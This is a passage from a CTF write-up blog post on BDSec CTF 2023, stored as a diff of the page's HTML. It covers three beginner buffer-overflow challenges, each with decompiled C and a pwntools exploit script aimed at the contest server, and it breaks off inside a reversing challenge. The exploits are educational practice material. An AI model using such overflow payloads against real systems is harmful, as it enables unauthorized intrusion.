@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Over the weekend, I took part in BDSEC CTF 2023, a CTF event designed for beginners. It was a fun and approachable competition where I managed to solve various challenges.   All challenges can be fou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF WriteUp: BDSec 2023">
+<meta property="og:url" content="https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/index.html">
+<meta property="og:site_name" content="sf4ult">
+<meta property="og:description" content="Over the weekend, I took part in BDSEC CTF 2023, a CTF event designed for beginners. It was a fun and approachable competition where I managed to solve various challenges.   All challenges can be fou">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/front.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/pwn/ghost.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/pwn/anyaForger.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/pwn/callme.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/rev/luckynumFunc.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/rev/lucky_number.gif">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/rev/lucky_number.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/rev/not_that_easy.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post5/rev/not_that_easy.gif">
+<meta property="article:published_time" content="2023-07-21T20:10:15.000Z">
+<meta property="article:modified_time" content="2023-07-22T12:57:27.073Z">
+<meta property="article:author" content="Durgesh">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="reversing">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="OSINT">
+<meta property="article:tag" content="networking">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post5/front.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF WriteUp: BDSec 2023</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 vazir">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/08/post4/wanictf_2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&text=CTF WriteUp: BDSec 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&is_video=false&description=CTF WriteUp: BDSec 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: BDSec 2023&body=Check out this article: https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&title=CTF WriteUp: BDSec 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&name=CTF WriteUp: BDSec 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/07/22/post5/bdsecCTF_2023/&t=CTF WriteUp: BDSec 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ghost"><span class="toc-number">1.1.</span> <span class="toc-text">Ghost</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func"><span class="toc-number">1.1.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#anyaForger"><span class="toc-number">1.3.</span> <span class="toc-text">anyaForger</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln-func"><span class="toc-number">1.3.1.</span> <span class="toc-text">vuln func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callme"><span class="toc-number">1.5.</span> <span class="toc-text">callme</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lucky-Number"><span class="toc-number">2.1.</span> <span class="toc-text">Lucky Number</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-2"><span class="toc-number">2.1.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Not-That-Easy"><span class="toc-number">2.2.</span> <span class="toc-text">Not That Easy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-func-3"><span class="toc-number">2.2.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTF WriteUp: BDSec 2023
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Durgesh</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-21T20:10:15.000Z" class="dt-published" itemprop="datePublished">2023-07-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/OSINT/" rel="tag">OSINT</a>, <a class="p-category" href="/tags/misc/" rel="tag">misc</a>, <a class="p-category" href="/tags/networking/" rel="tag">networking</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/reversing/" rel="tag">reversing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/imgs/post5/front.png" alt="front"></p>
+<p>Over the weekend, I took part in BDSEC CTF 2023, a CTF event designed for beginners. It was a fun and approachable competition where I managed to solve various challenges.  </p>
+<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/Durge5h/CTFs/tree/main/Competition/BDSecCTF-2023">here</a></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>All pwn challenge was typical and easy </p>
+<h3 id="Ghost"><a href="#Ghost" class="headerlink" title="Ghost"></a>Ghost</h3><h4 id="main-func"><a href="#main-func" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">char</span> vuln_buff [<span class="number">64</span>];</span><br><span class="line">  <span class="type">int</span> target;</span><br><span class="line">  <span class="type">char</span> buff [<span class="number">264</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  printCatArt();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ghostly Haunting: Mysterious Apparitions Spotted in Abandoned Mansion!&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ghost code: &quot;</span>);</span><br><span class="line">  gets(buff);</span><br><span class="line">  <span class="built_in">strcpy</span>(vuln_buff,buff);</span><br><span class="line">  <span class="keyword">if</span> (target == <span class="number">0x44434241</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BDSEC&#123;you_need_to_find_flag_in_server!&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have escaped the ghost!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>vulnerable <code>gets</code> function being used that take the user input without checking bound </li>
+<li>then <code>strcpy</code> function copy <strong>buff</strong> var’s data to <strong>vuln_buff</strong> (basically we control the vuln_buff)</li>
+<li>then  <strong>target</strong> var is being checked with <strong>0x44434241</strong> </li>
+<li>if its equal to that pre defined value print the flag or exit the program</li>
+</ul>
+<p>as <strong>target</strong> variable is adjacent to vuln_buff we can overwrite it.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./ghost&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">4000</span>)</span><br><span class="line">    matchMe = <span class="number">0x44434241</span></span><br><span class="line">    payload = cyclic(<span class="number">64</span>) + p64(matchMe) </span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/post5/pwn/ghost.png" alt="Ghost.png"></p>
+<h3 id="anyaForger"><a href="#anyaForger" class="headerlink" title="anyaForger"></a>anyaForger</h3><h4 id="vuln-func"><a href="#vuln-func" class="headerlink" title="vuln func"></a>vuln func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> local_30 [<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = <span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the secret word: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(local_30);</span><br><span class="line">  <span class="keyword">if</span> (local_10 == <span class="number">-0x21524111</span>) &#123;</span><br><span class="line">    anyaforger();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sorry, that\&#x27;s not the secret word.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>same as previous one </p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./beef&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">31337</span>)</span><br><span class="line">    negative_value = -<span class="number">0x21524111</span></span><br><span class="line">    <span class="comment">#decimal_value = int(str(negative_value), 0)</span></span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">32</span>) + pack(negative_value) </span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/post5/pwn/anyaForger.png" alt="anyaForger.png"></p>
+<h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><h4 id="main-func-1"><a href="#main-func-1" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_54 [<span class="number">64</span>];</span><br><span class="line">  code *local_14;</span><br><span class="line">  undefined *puStack16;</span><br><span class="line">  </span><br><span class="line">  puStack16 = &amp;stack0x00000004;</span><br><span class="line">  local_14 = (code *)<span class="number">0x0</span>;</span><br><span class="line">  printDogArt();</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who let the dogs out:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_08048a94,local_54);</span><br><span class="line">  <span class="keyword">if</span> (local_14 == (code *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I tell the fellas start the name calling!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Well, the party was nice, the party was  @ %p\n&quot;</span>,local_14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    (*local_14)();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hmm same as prev but this instead of any particular value we have to call the <code>callme</code> function </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./callme&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">3333</span>)</span><br><span class="line">    payload = cyclic(<span class="number">64</span>)+ pack(<span class="number">0x0804875e</span>) </span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/post5/pwn/callme.png" alt="callme.png"></p>
+<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Lucky-Number"><a href="#Lucky-Number" class="headerlink" title="Lucky Number"></a>Lucky Number</h3><h4 id="main-func-2"><a href="#main-func-2" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">long</span> expected;</span><br><span class="line">  <span class="type">long</span> input;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  expected = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; _                _            _   _                 _                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |              | |          | \\ | |               | |               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |    _   _  ___| | ___   _  |  \\| |_   _ _ __ ___ | |__   ___ _ __  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |   | | | |/ __| |/ / | | | | . ` | | | | \&#x27;_ ` _ \\| 